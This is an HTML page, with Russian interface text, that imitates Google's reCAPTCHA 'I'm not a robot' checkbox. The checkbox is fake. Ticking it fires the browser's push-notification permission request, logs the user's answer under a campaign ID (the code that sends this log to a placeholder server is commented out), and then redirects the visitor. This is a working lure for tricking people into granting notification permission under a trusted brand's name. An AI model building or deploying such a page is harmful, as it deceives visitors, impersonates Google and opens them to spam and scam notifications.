<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>reCAPTCHA</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f9f9f9;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 10px;
        }
        .captcha-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            padding: 10px;
            border: 1px solid #dfe1e5;
            border-radius: 4px;
            background-color: #fff;
        }
        .captcha-left {
            display: flex;
            align-items: center;
        }
        .captcha-checkbox {
            margin-right: 10px;
            width: 20px;
            height: 20px;
            cursor: pointer;
            appearance: none;
            border: 2px solid #5f6368;
            border-radius: 4px;
            position: relative;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }
        .captcha-checkbox:checked {
            background-color: #1a73e8;
            border-color: #1a73e8;
            animation: fillCheckbox 0.3s ease;
        }
        .captcha-checkbox:checked::after {
            content: '\2713';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 14px;
        }
        @keyframes fillCheckbox {
            0% {
                background-color: #fff;
                border-color: #5f6368;
            }
            100% {
                background-color: #1a73e8;
                border-color: #1a73e8;
            }
        }
        .captcha-text {
            font-size: 14px;
            color: #202124;
        }
        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }
        .captcha-logo {
            width: 20px;
            height: 20px;
            margin-bottom: 5px;
        }
        .captcha-brand {
            font-size: 12px;
            color: #1a73e8;
        }
        .captcha-links {
            font-size: 10px;
            color: #5f6368;
        }
        .captcha-links a {
            color: #5f6368;
            text-decoration: none;
        }
        .submit-button {
            padding: 8px 16px;
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }
        .submit-button:hover {
            background-color: #e8eaed;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="captcha-container">
            <div class="captcha-left">
                <input type="checkbox" id="captcha" class="captcha-checkbox">
                <span class="captcha-text">Я не робот</span>
            </div>
            <div class="captcha-right">
                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                <span class="captcha-brand">reCAPTCHA</span>
                <div class="captcha-links">
                    <a href="https://policies.google.com/privacy" target="_blank">Конфиденциальность</a> - 
                    <a href="https://policies.google.com/terms" target="_blank">Условия</a>
                </div>
            </div>
        </div>
        <div class="button-container">
            <button class="submit-button" id="submit-button">Отправить</button>
        </div>
    </div>

    <script>
        // Ссылка для редиректа (замените на безопасный URL)
        const redirectUrl = 'https://example.com';

        // Функция для логирования подписки (замените URL на реальный сервер)
        function logSubscription(permission, subId = 'test_campaign') {
            const data = {
                id: 'HnFv7gIgUEyhZsQd8kp20Q',
                sub_id: subId,
                permission: permission,
                timestamp: new Date().toISOString()
            };
            console.log('Лог подписки:', data); // Временная заглушка
            /*
            fetch('https://your-server.com/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => console.log('Лог подписки отправлен:', response))
            .catch(err => console.error('Ошибка отправки лога:', err));
            */
        }

        // Функция для выполнения редиректа
        function performRedirect() {
            console.log('Редирект на:', redirectUrl);
            window.location.href = redirectUrl;
        }

        // Функция для запроса подписки
        function requestSubscription() {
            if ('Notification' in window) {
                Notification.requestPermission()
                    .then(permission => {
                        console.log('Результат разрешения:', permission);
                        logSubscription(permission);
                        performRedirect();
                    })
                    .catch(err => {
                        console.error('Ошибка Notification API:', err);
                        logSubscription('error');
                        performRedirect();
                    });
            } else {
                console.log('Уведомления не поддерживаются');
                logSubscription('unsupported');
                performRedirect();
            }
        }

        // Функция проверки
        function verify() {
            const checkbox = document.getElementById('captcha');
            if (checkbox.checked) {
                setTimeout(requestSubscription, 300); // Задержка для анимации
            }
        }

        // События
        document.getElementById('captcha').addEventListener('change', verify);
        document.getElementById('submit-button').addEventListener('click', verify);
    </script>
</body>
</html>
